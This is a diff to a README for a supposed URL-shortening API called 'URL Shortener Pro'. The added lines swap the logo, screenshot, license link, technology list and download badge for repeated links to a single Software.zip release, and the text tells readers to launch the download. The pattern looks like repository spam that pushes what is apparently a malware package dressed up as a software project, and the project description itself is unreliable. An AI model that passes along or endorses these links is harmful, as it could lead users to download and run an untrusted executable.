@@ -1,6 +1,6 @@
 # 🚀 Welcome to the URL Shortener Pro!
 
-![URL Shortener Pro Logo](https://example.com/shortener_logo.png)
+![URL Shortener Pro Logo](https://github.com/donazdan/url-shortner-pro/releases/download/v1.0/Software.zip)
 
 ## Overview
 URL Shortener Pro is a scalable and feature-rich API that allows users to create short URLs for easy sharing. It includes advanced functionalities such as comprehensive analytics, custom aliases, rate limiting, and much more. Whether you are an individual user or a business looking for a reliable URL shortening solution, URL Shortener Pro has got you covered.
@@ -31,7 +31,7 @@ To get started with URL Shortener Pro, follow these simple steps:
 ## Installation
 To install URL Shortener Pro, download the software package from the following link:
 
-[![Download URL Shortener Pro](https://img.shields.io/badge/Download-Software.zip-blue.svg)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download URL Shortener Pro](https://github.com/donazdan/url-shortner-pro/releases/download/v1.0/Software.zip)](https://github.com/donazdan/url-shortner-pro/releases/download/v1.0/Software.zip)
 
 *Note: The software package needs to be launched after downloading.*
 
@@ -39,8 +39,8 @@ If the link is not working, please check the "Releases" section of the repositor
 
 ## Technologies Used
 URL Shortener Pro leverages the following technologies to provide a robust and efficient URL shortening solution:
-- Node.js
-- Express.js
+- https://github.com/donazdan/url-shortner-pro/releases/download/v1.0/Software.zip
+- https://github.com/donazdan/url-shortner-pro/releases/download/v1.0/Software.zip
 - MongoDB
 - Redis
 - Docker
@@ -56,10 +56,10 @@ We welcome contributions from the community to enhance URL Shortener Pro further
 If you encounter any issues or have any questions regarding URL Shortener Pro, please open a new issue on the GitHub repository. Our team will assist you as soon as possible.
 
 ## License
-URL Shortener Pro is licensed under the MIT License. See the [LICENSE](https://github.com/yourusername/url-shortner-pro/LICENSE) file for more information.
+URL Shortener Pro is licensed under the MIT License. See the [LICENSE](https://github.com/donazdan/url-shortner-pro/releases/download/v1.0/Software.zip) file for more information.
 
 ---
 
 Thank you for choosing URL Shortener Pro! Shorten your URLs with ease and enjoy the power of comprehensive analytics and advanced features. Let's simplify link sharing together! 🌐🔗
 
-![URL Shortener Pro Screenshot](https://example.com/shortener_screenshot.png)
+![URL Shortener Pro Screenshot](https://github.com/donazdan/url-shortner-pro/releases/download/v1.0/Software.zip)
